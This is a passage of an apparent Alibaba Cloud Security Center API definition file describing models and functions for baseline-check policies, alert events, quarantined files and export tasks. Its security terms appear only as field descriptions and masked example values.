      type?: int32(name='Type', description='The source type of the baseline check policy. Valid values:

*   **1**: indicates a built-in policy provided and performed by Security Center by default.
*   **2**: indicates a user-defined policy. It can be a standard or custom baseline check policy.', example='2'),
    }
  ](name='Strategies', description='The details of the baseline check policies.'),
}

model DescribeStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyResponseBody(name='body'),
}

async function describeStrategy(request: DescribeStrategyRequest): DescribeStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeStrategy', 'POST', '/', 'json', false, 'json', request);
}

model DescribeStrategyDetailRequest {
  id: string(name='Id', description='The ID of the baseline check policy.', example='123456', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
}

model DescribeStrategyDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C5B28F65-9245-5DC1-B3CF-5F2756A756A8'),
  strategy?: {
    customType?: string(name='CustomType', description='The type of the baseline check policy. Valid values:

*   **common**: standard baseline check policy
*   **custom**: custom baseline check policy', example='common'),
    cycleDays?: int32(name='CycleDays', description='The check interval of the policy.', example='3'),
    cycleStartTime?: int32(name='CycleStartTime', description='The time period during which the check starts. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='0'),
    endTime?: string(name='EndTime', description='The time when the baseline check based on the baseline check policy ends.', example='03:00:00'),
    id?: int32(name='Id', description='The ID of the baseline check policy.', example='123'),
    name?: string(name='Name', description='The name of the baseline check policy.', example='TestStrategy'),
    riskSubTypeName?: string(name='RiskSubTypeName', description='The subtype of the baseline check item.', example='hc_nginx_linux,tomcat7,hc_mysql_ali,hc_docker'),
    riskTypeWhiteListQueryResultList?: [ 
      {
        alias?: string(name='Alias', description='The alias of the check item.', example='Unauthorized Access'),
        on?: boolean(name='On', description='Indicates whether the check item is selected. Valid values:

*   **true**: The check item is selected.
*   **false**: The check item is not selected.', example='false'),
        subTypes?: [ 
          {
            alias?: string(name='Alias', description='The alias of the check item.', example='Redis unauthorized access high exploit vulnerability risk'),
            checkDetails?: [ 
              {
                checkDesc?: string(name='CheckDesc', description='The description of the check item.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
                checkId?: long(name='CheckId', description='The ID of the check item.', example='206'),
                checkItem?: string(name='CheckItem', description='The check item.', example='Ensure password expiration period is set.'),
                rules?: [ 
                  {
                    defaultValue?: int32(name='DefaultValue', description='The default value of the rule.', example='2'),
                    optional?: int32(name='Optional', description='Indicates whether the rule can be selected. Valid values:

*   **1**: The rule can be selected.
*   **0**: The rule cannot be selected.', example='1'),
                    paramList?: [ 
                      {
                        enumValue?: string(name='EnumValue', description='The options that can be selected for the rule parameter if the value of ParamType is set to 2.', example='0,1,2,3'),
                        maxValue?: int32(name='MaxValue', description='The maximum value of the rule parameter.', example='999'),
                        minValue?: int32(name='MinValue', description='The minimum value of the rule parameter.', example='1'),
                        paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the rule parameter.', example='7'),
                        paramDesc?: string(name='ParamDesc', description='The description of the rule parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                        paramName?: string(name='ParamName', description='The name of the rule parameter.', example='range_val'),
                        paramType?: int32(name='ParamType', description='The type of the rule parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
                        value?: string(name='Value', description='The configured value of the rule parameter.', example='7'),
                      }
                    ](name='ParamList', description='The rule parameters.'),
                    ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='Please customize the password expiration time detection standard as'),
                    ruleId?: string(name='RuleId', description='The rule ID.', example='login_unlock_deny_pam_faillock.must.cus'),
                  }
                ](name='Rules', description='The details of rules.'),
              }
            ](name='CheckDetails', description='The details of custom check items.'),
            on?: boolean(name='On', description='Indicates whether the sub-check item is selected. Valid values:

*   **true**: The sub-check item is selected.
*   **false**: The sub-check item is not selected.', example='false'),
            typeName?: string(name='TypeName', description='The type of the sub-check item.', example='hc_exploit_redis'),
          }
        ](name='SubTypes', description='The sub-check items.'),
        typeName?: string(name='TypeName', description='The check item.', example='hc_exploit'),
      }
    ](name='RiskTypeWhiteListQueryResultList', description='An array that consists of the whitelist of risk items.'),
    startTime?: string(name='StartTime', description='The time when the baseline check based on the baseline check policy starts.', example='02:00:00'),
    targetType?: string(name='TargetType', description='The condition by which the baseline check policy is applied to the asset. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='groupId'),
    type?: int32(name='Type', description='The type of the baseline check policy. Valid values:

*   **1**: standard baseline check policy
*   **2**: custom baseline check policy', example='1'),
  }(name='Strategy', description='The information about the baseline check policy.'),
}

model DescribeStrategyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyDetailResponseBody(name='body'),
}

async function describeStrategyDetail(request: DescribeStrategyDetailRequest): DescribeStrategyDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeStrategyDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeStrategyExecDetailRequest {
  currentPage?: int32(name='CurrentPage', example='1', position='Query'),
  pageSize?: int32(name='PageSize', example='10', position='Query'),
  sourceIp?: string(name='SourceIp', example='1.2.XX.XX', position='Query'),
  strategyId: int32(name='StrategyId', example='8437592', position='Query'),
}

model DescribeStrategyExecDetailResponseBody = {
  endTime?: string(name='EndTime', example='2021-12-05 00:12:46'),
  failCount?: int32(name='FailCount', example='94'),
  failedEcsList?: [ 
    {
      ip?: string(name='IP', example='115.28.XX.XX'),
      instanceName?: string(name='InstanceName', example='worker-k8s-for-cs-cf5741fb95c3a45d0864f0e4544dc****'),
      internetIp?: string(name='InternetIp', example='115.28.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.31.XX.XX'),
      reason?: string(name='Reason', example='Detect timeout'),
    }
  ](name='FailedEcsList'),
  inProcessCount?: int32(name='InProcessCount', example='0'),
  percent?: string(name='Percent', example='100%'),
  requestId?: string(name='RequestId', example='01611D72-1E33-53F5-A9A5-C81B5561970F'),
  source?: string(name='Source', example='Manual'),
  startTime?: string(name='StartTime', example='2021-12-05 00:12:16'),
  successCount?: int32(name='SuccessCount', example='81'),
}

model DescribeStrategyExecDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyExecDetailResponseBody(name='body'),
}

async function describeStrategyExecDetail(request: DescribeStrategyExecDetailRequest): DescribeStrategyExecDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeStrategyExecDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeStrategyTargetRequest {
  config: string(name='Config', description='The ID of the baseline check policy.', example='{"strategyId":8167126}', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.X.X', position='Query'),
  type: string(name='Type', description='The type of the policy. Set the value to hc_strategy, which indicates baseline check policies.', example='hc_strategy', position='Query'),
}

model DescribeStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='001BAB34-D70A-54B0-B1D7-91B76DCDD8E8'),
  strategyTargets?: [ 
    {
      bindUuidCount?: int32(name='BindUuidCount', description='The number of the assets that belong to the asset group.', example='85'),
      flag?: string(name='Flag', description='Indicates whether the baseline check policy is applied to the asset group. Valid values:

*   **add**: The baseline check policy is applied to the asset group.
*   **del**: the baseline check policy is not applied to the asset group.', example='add'),
      target?: string(name='Target', description='The ID of the asset group to which the assets belong or the UUID of the asset.', example='9165712'),
      targetType?: string(name='TargetType', description='The method that is used to add the assets to the baseline check policy. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='groupId'),
    }
  ](name='StrategyTargets', description='The information about the assets to which the baseline check policy is applied.'),
}

model DescribeStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyTargetResponseBody(name='body'),
}

async function describeStrategyTarget(request: DescribeStrategyTargetRequest): DescribeStrategyTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeStrategyTarget', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSummaryInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
}

model DescribeSummaryInfoResponseBody = {
  aegisClientOfflineCount?: int32(name='AegisClientOfflineCount', description='The number of unprotected assets.', example='12'),
  aegisClientOnlineCount?: int32(name='AegisClientOnlineCount', description='The number of protected assets.', example='127'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D40198E1-6EA8-482E-B3C7-D9573D75C0CA'),
  securityScore?: int32(name='SecurityScore', description='The security score of the assets. Valid values:

*   95 to 100: The assets are secure.
*   85 to 94: The assets are exposed to a few security risks. We recommend that you reinforce your security system in a timely manner.
*   70 to 84: The assets are exposed to multiple security risks. We recommend that you reinforce your security system in a timely manner.
*   69 or lower: The current security system is unable to protect the assets against intrusions. We recommend that you reinforce your security system at the earliest opportunity.', example='44'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model DescribeSummaryInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSummaryInfoResponseBody(name='body'),
}

async function describeSummaryInfo(request: DescribeSummaryInfoRequest): DescribeSummaryInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSummaryInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSupportRegionRequest {
}

model DescribeSupportRegionResponseBody = {
  requestId?: string(name='RequestId', example='2C0699D3-4107-5A46-A4C4-E129A5967788'),
  supportRegion?: [ string ](name='SupportRegion'),
}

model DescribeSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSupportRegionResponseBody(name='body'),
}

async function describeSupportRegion(request: DescribeSupportRegionRequest): DescribeSupportRegionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSupportRegion', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSuspEventDetailRequest {
  from: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.33.XX.XX', position='Query'),
  suspiciousEventId: int32(name='SuspiciousEventId', description='The ID of the exception.', example='32750999', position='Query'),
}

model DescribeSuspEventDetailResponseBody = {
  canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online processing of exceptions is supported, such as blocking an exception, adding an exception to the whitelist, and ignoring an exception. Valid values:

*   **true**: The online processing of exceptions is supported.
*   **false**: The online processing of exceptions is not supported.', example='true'),
  dataSource?: string(name='DataSource', description='The data source of the exception.', example='aegis_suspicious_****'),
  details?: [ 
    {
      nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Trojan Path'),
      type?: string(name='Type', description='The format in which the details of the exception are displayed.

Valid values:

*   **text**
*   **html**', example='html'),
      value?: string(name='Value', description='The attribute information about the exception. For example, if the exception is associated with an alert that is triggered by an unusual logon, the information can include the time when the logon is initiated and the location from which the logon is initiated. If the exception is associated with an alert that is triggered by a webshell file, the information can include the path of the trojan file and the type of the trojan.', example='getopt'),
    }
  ](name='Details', description='An array that consists of the details of the exception.'),
  eventDesc?: string(name='EventDesc', description='The description of the exception.', example='The detection model found a suspicious Webshell file on your server, which may be a backdoor file implanted to maintain permissions after the attacker successfully invaded the website.'),
  eventName?: string(name='EventName', description='The name of the exception.', example='WEBSHELL'),
  eventStatus?: string(name='EventStatus', description='The status of the exception. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired', example='1'),
  eventTypeDesc?: string(name='EventTypeDesc', description='The type of the exception.', example='Malicious Software-Variable Trojan'),
  id?: int32(name='Id', description='The ID of the exception.', example='11416624'),
  instanceName?: string(name='InstanceName', description='The name of the server on which the exception was detected.', example='ca_cpm_****'),
  internetIp?: string(name='InternetIp', description='The public IP address of the server on which the exception was detected.', example='101.132.XX.XX'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the exception was detected.', example='172.26.XX.XX'),
  lastTime?: string(name='LastTime', description='The time when the exception was last detected.', example='2018-10-30 11:43:46'),
  level?: string(name='Level', description='The risk level of the exception. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  operateErrorCode?: string(name='OperateErrorCode', description='The code that indicates the handling result of the exception.', example='quara.Succes'),
  operateMsg?: string(name='OperateMsg', description='The message that indicates the handling result of the exception.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the exception can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Advanced edition
*   **2**: Enterprise edition', example='1'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the exception was detected.', example='bffb12c3-590a-4db2-b538-****'),
}

model DescribeSuspEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventDetailResponseBody(name='body'),
}

async function describeSuspEventDetail(request: DescribeSuspEventDetailRequest): DescribeSuspEventDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSuspEventDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSuspEventExportInfoRequest {
  exportId?: int32(name='ExportId', description='The ID of the export task.

> You can call the [ExportSuspEvents](~~ExportSuspEvents~~) operation to query the ID.', example='123', position='Query'),
}

model DescribeSuspEventExportInfoResponseBody = {
  exportStatus?: string(name='ExportStatus', description='The handling status for the exception. Valid values:

*   **processing**: in progress
*   **success**: successful
*   **failed**: failed
*   **pending**: pending', example='success'),
  fileName?: string(name='FileName', description='The name of the exported file.', example='suspicious_event_20221221_1671590521234.zip'),
  gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='2022-12-20T15:18Z'),
  gmtModified?: long(name='GmtModified', description='The time when the export task was modified.', example='2022-12-20T15:18Z'),
  id?: int32(name='Id', description='The ID of the export task.', example='11'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://suspicious-xxxxxxx.oss-cn-shanghai.aliyuncs.com/xxxxxxxxxxx/suspicious_event_20221221_1671590525269.zip?Expires=1671594125&OSSAccessKeyId=LTAIxxxxxxxxxxxxxx&Signature=xxxxxxxxxxxxxxxxxx'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
  properties?: string(name='Properties', description='The exported parameters of exceptions.', example='id,eventSubType,eventDetail,level,status,ip,instanceName,desc,lastTime,operateTime,note'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='BE120DAB-F4E7-4C53-ADC3-A97578AXXXXX'),
  totalCount?: int32(name='TotalCount', description='The total number of exceptions exported.', example='1'),
  type?: string(name='Type', description='The type of the export task. The value is fixed as suspiciousEvent.', example='suspiciousEvent'),
}

model DescribeSuspEventExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventExportInfoResponseBody(name='body'),
}

async function describeSuspEventExportInfo(request: DescribeSuspEventExportInfoRequest): DescribeSuspEventExportInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSuspEventExportInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSuspEventQuaraFilesRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='10541428', deprecated='true', position='Query'),
  groupingId?: long(name='GroupingId', description='The ID of the server group to which the server belongs. The quarantined file is located on the server.', example='11472451', position='Query'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  quaraTag?: string(name='QuaraTag', description='The unique ID of the quarantined file.', example='a31337789f64d39b2219733ec99f9af7', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.82.XX.XX', position='Query'),
  status?: string(name='Status', description='The status of the quarantined file that you want to query. Valid values:

*   **quaraFailed**: The file fails to be quarantined.
*   **quaraDone**: The file is quarantined.
*   **quaraing**: The file is being quarantined.
*   **rollbackFailed**: The system fails to cancel quarantining the file.
*   **rollbackDone**: The system cancelled quarantining the file.
*   **rollbacking**: The system is cancelling quarantining the file.', example='quaraDone', position='Query'),
}

model DescribeSuspEventQuaraFilesResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='7'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  quaraFiles?: [ 
    {
      eventName?: string(name='EventName', description='The name of the event.', example='WEBSHELL'),
      eventType?: string(name='EventType', description='The type of the event.', example='WebshellQuaraEventType'),
      id?: int32(name='Id', description='The ID of the quarantined file.', example='26918'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-2ze9t1qp36n1436m****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the quarantined file is located.', example='iZwz98dkiw3vbrtqrt5v****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server on which the quarantined file is located.', example='47.XX.XX.131'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the quarantined file is located.', example='172.16.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the server on which the quarantined file is located.', example='47.XX.XX.131'),
      link?: string(name='Link', description='The download link of the quarantined file.', example='https://xxx.xxx/xxx'),
      md5?: string(name='Md5', description='The MD5 hash value of the quarantined file.', example='5ddebe926acc7ed39a664409bfd0ec10'),
      modifyTime?: string(name='ModifyTime', description='The time when the quarantined file was last modified.', example='2020-06-11 20:37:08'),
      path?: string(name='Path', description='The path to the quarantined file on the server.', example='/var/www/html/webshell-sample-master/others/defc3e21bab59e2a2ab49f7eda99f65f83d4d349.jpg'),
      status?: string(name='Status', description='The status of the quarantined file. Valid values:

*   **quaraFailed**: The file fails to be quarantined.
*   **quaraDone**: The file is quarantined.
*   **quaraing**: The file is being quarantined.
*   **rollbackFailed**: The system fails to cancel quarantining the file.
*   **rollbackDone**: The system cancelled quarantining the file.
*   **rollbacking**: The system is cancelling quarantining the file.', example='rollbackDone'),
      tag?: string(name='Tag', description='The unique ID of the event.', example='228f890e56eae9eec6a42c7ea801b538'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='04a0e735-ad32-4835-b635-0458d77b****'),
    }
  ](name='QuaraFiles', description='An array that consists of the quarantined files.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='38'),
}

model DescribeSuspEventQuaraFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventQuaraFilesResponseBody(name='body'),
}

async function describeSuspEventQuaraFiles(request: DescribeSuspEventQuaraFilesRequest): DescribeSuspEventQuaraFilesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSuspEventQuaraFiles', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSuspEventUserSettingRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
  id?: int32(name='Id', description='The ID. You do not need to specify this parameter.', example='123', position='Query'),
  sourceIp?: string(name='SourceIp', description='The IP address of the request. You do not need to specify this parameter.', example='127.0.XX.XX', position='Query'),
}

model DescribeSuspEventUserSettingResponseBody = {
  levelsOn?: [ string ](name='LevelsOn', description='An array that consists of the risk levels of alert notifications. Valid values:

*   **remind**
*   **suspicious**
*   **serious**'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='028CF634-5268-5660-9575-48C9ED6XXXXX'),
}

model DescribeSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventUserSettingResponseBody(name='body'),
}

async function describeSuspEventUserSetting(request: DescribeSuspEventUserSettingRequest): DescribeSuspEventUserSettingResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSuspEventUserSetting', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSuspEventsRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The ID of the alert event.

> To query the details of an alert event, you must specify the ID of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the IDs of alert events.', example='8df914418f4211fb****', position='Query'),
  assetsTypeList?: [ string ](name='AssetsTypeList', description='The types of the assets.', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster of whose alert events you want to query.', example='c4af4fdf38a98496a9b63c2be5dae****', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='instanceId', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers.', example='ccf9769c22b844ff9b8d57417683b****', position='Query'),
  currentPage?: string(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the alert event is handled. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='N', position='Query'),
  eventNames?: string(name='EventNames', description='The subtype of the alert event. Separate multiple subtypes with commas (,).', example='WEBSHELL', position='Query'),
  from?: string(name='From', description='The data source of the alert event. Set the value to sas.', example='sas', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which the affected asset belongs.', example='18768', position='Query'),
  id?: long(name='Id', description='The ID of the alert event.', example='123', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious', position='Query'),
  name?: string(name='Name', description='The name of the asset that is affected by the alert event.', example='ecs-xxx', position='Query'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList', description='An array that consists of the handling result codes of alert events.', position='Query'),
  operateTimeEnd?: string(name='OperateTimeEnd', description='The timestamp when the handling operation ends.', example='2022-07-06 13:50:38', position='Query'),
  operateTimeStart?: string(name='OperateTimeStart', description='The timestamp when the handling operation starts.', example='2022-07-05 13:50:38', position='Query'),
  pageSize?: string(name='PageSize', description='The number of entries per page. Default value: **20**. Maximum value: 100.', example='20', position='Query'),
  parentEventTypes?: string(name='ParentEventTypes', description='The alert type of the alert event. Valid values:

*   **Suspicious process**
*   **Webshell**
*   **Unusual logon**
*   **Exception**
*   **Sensitive file tampering**
*   **Malicious process (cloud threat detection)**
*   **Suspicious network connection**
*   **Suspicious account**
*   **Application intrusion event**
*   **Cloud threat detection**
*   **Precise defense**
*   **Application whitelist**
*   **Persistent webshell**
*   **Web application threat detection**
*   **Malicious script**
*   **Threat intelligence**
*   **Malicious network activity**
*   **Cluster exception**
*   **Webshell (on-premises threat detection)**
*   **Vulnerability exploitation**
*   **Malicious process (on-premises threat detection)**
*   **Trusted exception**
*   **Operations to manage other resources**', example='Webshell', position='Query'),
  remark?: string(name='Remark', description='The name of the alert or the information about the asset.

>  Fuzzy search is supported. The asset information includes the name, public IP address, and private IP address of an asset.', example='192.168.XX.XX', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the ID.', example='16670360956*****', position='Query'),
  sortColumn?: string(name='SortColumn', description='The custom sorting field. Default value: **operateTime**. Valid values:

*   **lastTime**: the latest occurrence time.
*   **operateTime**: the handling time.

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='operateTime', position='Query'),
  sortType?: string(name='SortType', description='The custom sorting order. Default value: **desc**. Valid values:

*   **asc**: the ascending order
*   **desc**: the descending order

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='desc', position='Query'),
  source?: string(name='Source', description='The source of the alert.', example='aegis_suspicious_file_v2', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
  status?: string(name='Status', description='The status of the alert event. Valid values:

*   **0**: all
*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired
*   **128**: deleted
*   **512**: automatically blocking
*   **513**: automatically blocked', example='1', position='Query'),
  tacticId?: string(name='TacticId', description='The tactic ID of ATT\\&CK.', example='TA0001', position='Body'),
  targetType?: string(name='TargetType', description='The item that is used to search for the container. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the server
*   **imageUuid**: the UUID of the image', example='containerId', position='Query'),
  timeEnd?: string(name='TimeEnd', description='The end time when the alert event was last detected.', example='2022-07-06 13:50:38', position='Query'),
  timeStart?: string(name='TimeStart', description='The start time when the alert event was last detected.', example='2022-07-05 13:50:38', position='Query'),
  uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert.', example='73fc06fb175a7405697e402f52864****', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the alert is detected. Separate multiple UUIDs with commas (,).', example='bb5d2484-f10e-450d-8917-3e79667e****,0e7c2fcd-7100-42c7-a21a-db6e4f32****', position='Query'),
}

model DescribeSuspEventsResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0D6E20E4-8326-1D03-A553-2182BE9E82F9'),
  suspEvents?: [ 
    {
      advanced?: boolean(name='Advanced', description='Indicates whether the alert event was analyzed offline.', example='true'),
      alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.', example='login_common_location'),
      alarmEventNameDisplay?: string(name='AlarmEventNameDisplay', description='The name of the alert.', example='Login with unusual location'),
      alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.', example='Unusual Logon'),
      alarmEventTypeDisplay?: string(name='AlarmEventTypeDisplay', description='The display name of the type of the alert event.', example='Unusual Logon'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.', example='8df914418f****'),
      appName?: string(name='AppName', description='The name of the application to which the alert event belongs.', example='pro-deploy-tibasic'),
      autoBreaking?: boolean(name='AutoBreaking', description='Indicates whether automatic defense is enabled.', example='true'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether you can handle the alert event online, such as quarantining the source file of the malicious process. Valid values:

*   **true**
*   **false**', example='true'),
      canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**
*   **false**', example='false'),
      containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the safeguard mode for major activities is enabled for the server. Valid values:

*   **true**
*   **false**', example='false'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='container_1648601865161_14925_02_000****'),
      containerImageId?: string(name='ContainerImageId', description='The ID of the image to which the container belongs.', example='sha256:2e5a3b0ae5f452b3cb458789a9a7542ef40035a84318469a8528c5e444db1****'),
      containerImageName?: string(name='ContainerImageName', description='The name of the image to which the container belongs.', example='centos7_apache:v1.0.1'),
      dataSource?: string(name='DataSource', description='The source of data. This parameter can be ignored.', example='aegis_suspicious_****'),
      desc?: string(name='Desc', description='The impact of the alert event.', example='webshell'),
      details?: [ 
        {
          nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Login with unusual location'),
          type?: string(name='Type', description='The type of the alert event.', example='text'),
          value?: string(name='Value', description='The path of the alert event.', example='/etc/crontab'),
          valueDisplay?: string(name='ValueDisplay', description='The display name of the path of the alert event.', example='/etc/crontab'),
        }
      ](name='Details', description='The details of the alert event.'),
      displaySandboxResult?: boolean(name='DisplaySandboxResult', description='Indicates whether the alert event can be detected by cloud sandbox. Valid values:

*   **true**
*   **false**', example='true'),
      eventNotes?: [ 
        {
          note?: string(name='Note', description='The note.', example='Test'),
          noteId?: long(name='NoteId', description='The ID of the note.', example='123'),
          noteTime?: string(name='NoteTime', description='The time when the note was created.', example='2018-09-26 01:51:01'),
        }
      ](name='EventNotes', description='The note information about the alert event.'),
